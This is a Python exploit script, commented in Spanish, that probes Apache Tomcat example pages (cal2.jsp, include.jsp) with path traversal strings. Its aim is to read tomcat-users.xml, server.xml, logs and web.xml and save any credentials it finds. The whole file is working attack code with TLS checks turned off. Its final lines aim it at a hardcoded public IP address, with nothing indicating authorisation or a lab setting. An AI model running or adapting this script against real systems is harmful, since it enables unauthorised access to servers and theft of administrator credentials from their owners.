import requests
import sys
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RealTraversalExploiter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
    
    def exploit_calendar_traversal(self):
        """Explotar el traversal real del calendario"""
        print("[+] Explotando vulnerabilidad real del calendario...")
        
        # El calendario muestra el path pero no el contenido, necesitamos otra aproximación
        cal_url = f"{self.target}/examples/jsp/cal/cal2.jsp"
        
        # Probar diferentes parámetros basados en lo que vimos
        test_params = [
            "time=../../../../conf/tomcat-users.xml",
            "date=../../../../conf/tomcat-users.xml", 
            "description=../../../../conf/tomcat-users.xml",
            "param=../../../../conf/tomcat-users.xml",
            "file=../../../../conf/tomcat-users.xml",
            "page=../../../../conf/tomcat-users.xml"
        ]
        
        for param in test_params:
            try:
                url = f"{cal_url}?{param}"
                print(f"Probando: {url}")
                response = self.session.get(url, timeout=10)
                
                if 'tomcat-users' in response.text and 'password' in response.text:
                    print(f"[CRITICAL] tomcat-users.xml EXPUESTO!")
                    self.save_file('tomcat-users.xml', response.text)
                    return response.text
                elif response.status_code == 200:
                    print(f"Respuesta: {len(response.text)} bytes")
                    # Guardar para análisis
                    with open(f"response_{param.split('=')[0]}.html", 'w') as f:
                        f.write(response.text)
            except Exception as e:
                print(f"Error: {e}")
    
    def direct_file_access(self):
        """Acceso directo a archivos usando paths conocidos"""
        print("\n[+] Acceso directo a archivos...")
        
        files_to_try = [
            '/conf/tomcat-users.xml',
            '/conf/server.xml', 
            '/logs/catalina.out',
            '/webapps/manager/WEB-INF/web.xml',
            '/WEB-INF/web.xml'
        ]
        
        for file_path in files_to_try:
            # Usar el include.jsp que sabemos que funciona
            url = f"{self.target}/examples/jsp/include/include.jsp?page=..{file_path}"
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    print(f"Archivo: {file_path} -> {len(response.text)} bytes")
                    
                    if 'tomcat-users' in response.text:
                        print("[CRITICAL] tomcat-users.xml encontrado!")
                        self.save_file('tomcat-users-direct.xml', response.text)
                    elif 'server.xml' in response.text:
                        print("server.xml encontrado!")
                        self.save_file('server-real.xml', response.text)
            except Exception as e:
                print(f"Error en {file_path}: {e}")
    
    def save_file(self, filename, content):
        """Guardar archivo"""
        with open(filename, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(content)
        print(f"[+] Guardado como: {filename}")

# Ejecutar
exploiter = RealTraversalExploiter("http://189.254.143.102")
exploiter.exploit_calendar_traversal()
exploiter.direct_file_access()